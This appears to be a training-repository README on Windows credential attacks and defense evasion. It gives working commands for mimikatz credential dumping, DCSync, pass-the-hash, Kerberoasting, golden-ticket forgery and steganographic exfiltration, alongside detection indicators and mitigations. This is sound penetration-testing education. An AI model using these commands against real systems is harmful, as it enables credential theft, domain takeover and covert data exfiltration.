# Phase 07: Defense Evasion

## Overview

Defense Evasion encompasses techniques that adversaries use to avoid detection during compromises. This phase covers credential harvesting, pass-the-hash lateral movement, and steganography for covert data exfiltration. The tools here enable attackers to leverage captured credentials, hide network traffic patterns, and conceal data within innocent-looking files.

**MITRE ATT&CK:** [TA0005 - Defense Evasion](https://attack.mitre.org/tactics/TA0005/)

**Prerequisites:** Basic understanding of Windows authentication (NTLM, Kerberos), SMB protocol, and image file formats.

---

## Tool Categories

### Pass-the-Hash (Credential Reuse)

| Tool | Purpose | Difficulty |
|------|---------|------------|
| [mimikatz](pass_the_hash/mimikatz/) | Windows credential extraction (LSASS, SAM, Kerberos tickets) | Advanced |
| [netexec](pass_the_hash/netexec/) | Multi-protocol network execution and enumeration | Intermediate |
| [passing-the-hash](pass_the_hash/passing-the-hash/) | Patched tools accepting NTLM hashes for authentication | Intermediate |
| [rubeus](pass_the_hash/rubeus/) | Kerberos ticket manipulation, forgery, and abuse | Advanced |
| [smbmap](pass_the_hash/smbmap/) | SMB share enumeration and file operations | Beginner |
| [crackmapexec](pass_the_hash/crackmapexec/) | Legacy network exploitation (replaced by netexec) | Intermediate |
| [impacket-scripts](pass_the_hash/impacket-scripts/) | Python network protocol toolkit | Intermediate |
| [evil-winrm](pass_the_hash/evil-winrm/) | WinRM shell for remote Windows management | Intermediate |
| [freerdp](pass_the_hash/freerdp/) | RDP client with credential support | Beginner |

### Steganography (Data Hiding)

| Tool | Purpose | Difficulty |
|------|---------|------------|
| [steghide](steganography/steghide/) | JPEG/BMP/WAV/AU steganography with encryption | Beginner |
| [outguess](steganography/outguess/) | JPEG steganography using Huffman code redundancy | Beginner |
| [stegsnow](steganography/stegsnow/) | ASCII text steganography using whitespace | Beginner |
| [stegosuite](steganography/stegosuite/) | GUI steganography tool with AES encryption | Beginner |

### Anti-Virus Evasion

| Tool | Purpose | Difficulty |
|------|---------|------------|
| [av_evasion](av_evasion/) | AV evasion techniques and tools | Advanced |

---

## Attack Flow

```
┌─────────────────────────────────────────────────────────┐
│                    COMPROMISED HOST                      │
│                                                          │
│  1. mimikatz → Extract credentials from LSASS           │
│     ├── NTLM hashes                                      │
│     ├── Kerberos tickets                                 │
│     └── Plaintext passwords (WDigest)                    │
│                                                          │
│  2. Use credentials for lateral movement                 │
│     ├── netexec → SMB/LDAP/WinRM enumeration + exec     │
│     ├── smbmap → Share enumeration + file operations     │
│     ├── passing-the-hash → PtH tools (winexe, wmic)      │
│     └── rubeus → Kerberos ticket attacks                 │
│                                                          │
│  3. Steganography → Covert data exfiltration             │
│     ├── steghide → Embed in images/audio                 │
│     ├── outguess → Embed in JPEG (statistically safe)    │
│     ├── stegsnow → Embed in text files                   │
│     └── stegosuite → GUI-based embedding                 │
└─────────────────────────────────────────────────────────┘
```

---

## Credential Attack Matrix

| Attack | Tool | Method | Stealth |
|--------|------|--------|---------|
| Pass-the-Hash | mimikatz, netexec, smbmap | NTLM hash reuse | Medium |
| Overpass-the-Hash | mimikatz, rubeus | Hash → Kerberos TGT | Low |
| Kerberoasting | rubeus, netexec | TGS hash extraction | Medium |
| AS-REP Roasting | rubeus, netexec | Preauth bypass hashes | Medium |
| Golden Ticket | mimikatz, rubeus | Forged TGT (krbtgt hash) | High |
| Silver Ticket | mimikatz, rubeus | Forged TGS (service hash) | High |
| DCSync | mimikatz, impacket | Domain controller replication | Medium |
| Password Spray | netexec | Low-and-slow credential test | Medium |

---

## Quick Reference Commands

### Credential Dumping (mimikatz)

```bash
# On Windows target (elevated)
mimikatz.exe
privilege::debug
sekurlsa::logonpasswords    # All credentials
lsadump::sam                # Local hashes
lsadump::dcsync /user:krbtgt # Domain krbtgt hash
```

### Network Enumeration (netexec)

```bash
# Scan and authenticate
nxc smb 192.168.1.0/24 -u admin -p pass
nxc smb 192.168.1.0/24 -u admin -p pass --shares
nxc smb 192.168.1.0/24 -u admin -H 'LM:NTLM'  # Pass-the-Hash
nxc ldap 192.168.1.1 -u admin -p pass --kerberoast hashes.txt
```

### SMB Enumeration (smbmap)

```bash
smbmap -H 192.168.1.10 -u admin -p pass
smbmap -H 192.168.1.10 -u admin -p pass -r 'C$\Users'
smbmap -H 192.168.1.10 -u admin -p 'LM:NT'  # Pass-the-Hash
```

### Kerberos Attacks (rubeus)

```bash
# Kerberoast
Rubeus.exe kerberoast /outfile:hashes.txt

# AS-REP Roast
Rubeus.exe asreproast /outfile:asrep.txt

# Overpass-the-Hash
Rubeus.exe asktgt /user:admin /rc4:hash /ptt

# Golden Ticket
Rubeus.exe golden /rc4:krbtgt_hash /user:admin /domain:target.local /sid:S-1-5-21-... /ptt
```

### Steganography

```bash
# Steghide
steghide embed -cf cover.jpg -ef secret.txt -p "Pass"
steghide extract -sf stego.jpg -p "Pass"

# OutGuess
outguess -k "Key" secret.txt cover.jpg stego.jpg
outguess -k "Key" -r stego.jpg output.txt

# Stegsnow
echo "Message" | stegsnow -p "Pass" cover.txt stego.txt
stegsnow -C -p "Pass" stego.txt
```

---

## Detection Indicators

### Network

- Multiple SMB connections from single source (lateral movement)
- NTLM authentication without prior Kerberos ticket (PtH)
- RC4 Kerberos exchanges in AES environment (Rubeus/mimikatz)
- Unusual WMI/WinRM connections from workstations

### Host

- LSASS memory access by non-LSASS process (mimikatz)
- Privilege escalation events (Event 4672)
- Abnormal .kirbi files on disk (Rubeus)
- WDigest registry changes (UseLogonCredential)

### Application

- Large image files with unusual entropy (steganography)
- Text files with trailing whitespace patterns (stegsnow)
- Multiple share enumeration from single source (smbmap/netexec)

---

## Mitigation Checklist

- [ ] Enable Windows Credential Guard (blocks mimikatz)
- [ ] Enable LSA Protection (RunAsPPL)
- [ ] Disable WDigest (UseLogonCredential=0)
- [ ] Enforce SMB signing on all hosts
- [ ] Disable NTLM where possible (use Kerberos)
- [ ] Implement tiered administration model
- [ ] Monitor Event 4624 Type 3 (network logons)
- [ ] Monitor Event 4768/4769 (Kerberos) for RC4 usage
- [ ] Deploy network segmentation
- [ ] Implement least-privilege access controls
- [ ] Enable PowerShell logging and AMSI
- [ ] Deploy EDR for LSASS protection

---

## Practice Resources

| Platform | Relevant Labs |
|----------|---------------|
| [HackTheBox](https://www.hackthebox.com/) | Active Directory, Windows challenges |
| [TryHackMe](https://tryhackme.com/) | Kerberos, PtH, Steganography rooms |
| [VulnHub](https://www.vulnhub.com/) | Windows domain labs |
| [PentesterLab](https://pentesterlab.com/) | AD abuse exercises |
| [DVCP](https://github.com/safebuffer/vulnerable-AD) | Vulnerable AD lab |

---

## Files in This Phase

```
07_defense_evasion/
├── README.md                          # This file
├── pass_the_hash/
│   ├── mimikatz/
│   │   ├── mimikatz.md                # Full documentation (564 lines)
│   │   └── CHEATSHEET.md              # Quick reference
│   ├── netexec/
│   │   ├── netexec.md                 # Full documentation (532 lines)
│   │   └── CHEATSHEET.md              # Quick reference
│   ├── passing-the-hash/
│   │   └── passing-the-hash.md        # PtH technique guide
│   ├── rubeus/
│   │   └── rubeus.md                  # Kerberos abuse toolkit
│   ├── smbmap/
│   │   └── smbmap.md                  # SMB enumeration
│   ├── crackmapexec/                  # Legacy (see netexec)
│   ├── impacket-scripts/              # Python network toolkit
│   ├── evil-winrm/                    # WinRM shell
│   └── freerdp/                       # RDP client
├── steganography/
│   ├── steghide/
│   │   └── steghide.md               # JPEG/BMP/WAV steganography
│   ├── outguess/
│   │   └── outguess.md               # JPEG steganography
│   ├── stegsnow/
│   │   └── stegsnow.md               # Text steganography
│   └── stegosuite/
│       └── stegosuite.md              # GUI steganography
└── av_evasion/                        # AV evasion techniques
```

---

## Learning Path

1. **Start with:** smbmap (simplest, visual output)
2. **Then:** netexec (multi-protocol, most versatile)
3. **Then:** mimikatz (credential extraction, requires Windows knowledge)
4. **Then:** rubeus (Kerberos attacks, advanced)
5. **Steganography:** steghide → outguess → stegsnow (increasing complexity)
6. **Advanced:** passing-the-hash suite, impacket integration

---

## Legal Notice

These tools are for authorized security testing and educational purposes only. Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (CFAA) and equivalent laws worldwide. Always obtain written authorization before performing security testing.
